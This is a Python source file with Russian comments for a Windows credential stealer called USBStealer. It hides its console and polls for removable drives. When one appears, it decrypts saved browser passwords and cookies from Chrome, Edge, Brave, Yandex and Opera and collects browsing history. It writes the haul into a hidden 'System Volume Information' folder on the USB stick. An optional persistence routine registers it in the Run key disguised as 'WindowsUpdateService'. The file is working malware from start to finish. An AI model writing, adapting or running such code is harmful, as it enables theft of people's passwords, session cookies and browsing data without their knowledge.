import os
import json
import sqlite3
import shutil
import base64
import win32crypt
import win32file
import win32con
import win32gui
import win32process
from Crypto.Cipher import AES
import datetime
import sys
import platform
import time
import threading
import string
import random
import subprocess

# === КОНФИГУРАЦИЯ ===
CHECK_INTERVAL = 2  # Проверка каждые 2 секунды
TARGET_BROWSERS = ['Chrome', 'Edge', 'Brave', 'Yandex', 'Opera']
HIDE_CONSOLE = True  # Скрыть консольное окно
# ===================

class USBStealer:
    def __init__(self):
        self.running = True
        self.processed_usbs = set()  # Уже обработанные флешки
        self.hide_console()
        
    def hide_console(self):
        """Скрыть окно консоли"""
        if HIDE_CONSOLE:
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass

    def get_all_drives(self):
        """Получить список всех доступных дисков"""
        drives = []
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drive_type = win32file.GetDriveType(drive)
                # DRIVE_REMOVABLE = 2, DRIVE_FIXED = 3
                if drive_type == 2:  # Только съемные диски (флешки)
                    drives.append(drive)
        return drives

    def get_chrome_datetime(self, chromedate):
        """Конвертация даты Chrome"""
        if chromedate not in ('', None) and chromedate > 0:
            try:
                return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)
            except:
                return chromedate
        return ""

    def get_encryption_key(self, browser_path):
        """Получение ключа шифрования для браузера"""
        local_state_path = os.path.join(browser_path, "..", "Local State")
        if not os.path.exists(local_state_path):
            return None
        
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            
            if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]  # Удаление префикса 'DPAPI'
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            pass
        return None

    def decrypt_password(self, ciphertext, key):
        """Дешифровка пароля"""
        if not key:
            return ""
        try:
            # Для новых версий (AES)
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except:
            try:
                # Для старых версий (DPAPI)
                return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
            except:
                return ""

    def get_browser_paths(self):
        """Получить пути ко всем браузерам"""
        user_path = os.environ["USERPROFILE"]
        browsers = {
            'Chrome': os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
            'Edge': os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default"),
            'Brave': os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            'Yandex': os.path.join(user_path, "AppData", "Local", "Yandex", "YandexBrowser", "User Data", "Default"),
            'Opera': os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable")
        }
        return {name: path for name, path in browsers.items() if os.path.exists(path)}

    def steal_from_browser(self, browser_name, browser_path, key):
        """Сбор данных из конкретного браузера"""
        harvested = {
            "passwords": [],
            "history": [],
            "cookies": []
        }
        
        temp_dir = os.environ["TEMP"]
        databases = {
            "passwords": os.path.join(browser_path, "Login Data"),
            "history": os.path.join(browser_path, "History"),
            "cookies": os.path.join(browser_path, "Network", "Cookies")
        }
        
        for db_type, db_path in databases.items():
            if not os.path.exists(db_path):
                continue
                
            temp_db = os.path.join(temp_dir, f"{browser_name}_{db_type}_{os.getpid()}.db")
            try:
                shutil.copy2(db_path, temp_db)
            except:
                continue
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                if db_type == "passwords":
                    try:
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor.fetchall():
                            if row[1] and row[2]:
                                harvested["passwords"].append({
                                    "url": row[0],
                                    "username": row[1],
                                    "password": self.decrypt_password(row[2], key)
                                })
                    except:
                        pass
                        
                elif db_type == "history":
                    try:
                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                        for row in cursor.fetchall():
                            harvested["history"].append({
                                "url": row[0],
                                "title": row[1],
                                "time": str(self.get_chrome_datetime(row[2]))
                            })
                    except:
                        pass
                        
                elif db_type == "cookies":
                    try:
                        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
                        for row in cursor.fetchall():
                            if row[3]:
                                harvested["cookies"].append({
                                    "host": row[0],
                                    "name": row[1],
                                    "path": row[2],
                                    "value": self.decrypt_password(row[3], key)
                                })
                    except:
                        pass
                        
            except:
                pass
            finally:
                try:
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
        
        return harvested

    def collect_all_data(self):
        """Сбор данных со всех браузеров"""
        all_data = {
            "computer_name": platform.node(),
            "username": os.environ.get("USERNAME", ""),
            "timestamp": str(datetime.datetime.now()),
            "os": platform.platform(),
            "browsers": {}
        }
        
        browsers = self.get_browser_paths()
        
        for browser_name, browser_path in browsers.items():
            if browser_name not in TARGET_BROWSERS:
                continue
                
            try:
                key = self.get_encryption_key(browser_path)
                browser_data = self.steal_from_browser(browser_name, browser_path, key)
                
                # Добавляем только если есть данные
                if any(browser_data.values()):
                    all_data["browsers"][browser_name] = browser_data
            except:
                continue
        
        return all_data

    def save_to_usb(self, usb_path, data):
        """Сохранение данных на флешку"""
        try:
            # Создаем скрытую папку
            hidden_folder = os.path.join(usb_path, "System Volume Information")
            if not os.path.exists(hidden_folder):
                os.makedirs(hidden_folder)
                os.system(f'attrib +h +s "{hidden_folder}"')
            
            # Генерируем имя файла
            computer_name = platform.node().replace('.', '_').replace('-', '_')
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"data_{computer_name}_{timestamp}.json"
            filepath = os.path.join(hidden_folder, filename)
            
            # Сохраняем данные
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
            
            # Делаем файл скрытым
            os.system(f'attrib +h "{filepath}"')
            
            # Создаем маркерный файл (опционально)
            marker_path = os.path.join(hidden_folder, "collected.txt")
            with open(marker_path, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} - {computer_name} - {len(data['browsers'])} browsers\n")
            
            return True
        except:
            return False

    def process_usb(self, usb_path):
        """Обработка подключенной флешки"""
        if usb_path in self.processed_usbs:
            return
        
        print(f"[+] Обнаружена флешка: {usb_path}")
        self.processed_usbs.add(usb_path)
        
        try:
            # Сбор данных
            print("[*] Начинаю сбор данных...")
            data = self.collect_all_data()
            
            # Сохранение на флешку
            if self.save_to_usb(usb_path, data):
                print(f"[+] Данные сохранены на {usb_path}")
            else:
                print("[-] Ошибка сохранения на флешку")
                
        except Exception as e:
            print(f"[-] Ошибка: {e}")

    def monitor_usb(self):
        """Мониторинг подключения USB"""
        print("[*] Мониторинг USB-устройств запущен...")
        
        while self.running:
            current_drives = self.get_all_drives()
            
            # Проверяем новые флешки
            for drive in current_drives:
                if drive not in self.processed_usbs:
                    # Запускаем обработку в отдельном потоке
                    thread = threading.Thread(target=self.process_usb, args=(drive,))
                    thread.daemon = True
                    thread.start()
            
            time.sleep(CHECK_INTERVAL)

    def install_persistence(self):
        """Установка персистентности (опционально)"""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            # Получаем путь к текущему исполняемому файлу
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = os.path.abspath(__file__)
            
            # Добавляем в автозагрузку
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{current_file}"')
                
            print("[+] Добавлено в автозагрузку")
        except:
            pass

    def run(self):
        """Запуск монитора"""
        try:
            # Опционально: добавить в автозагрузку
            # self.install_persistence()
            
            self.monitor_usb()
        except KeyboardInterrupt:
            print("\n[+] Остановка...")
            self.running = False

if __name__ == "__main__":
    stealer = USBStealer()
    stealer.run()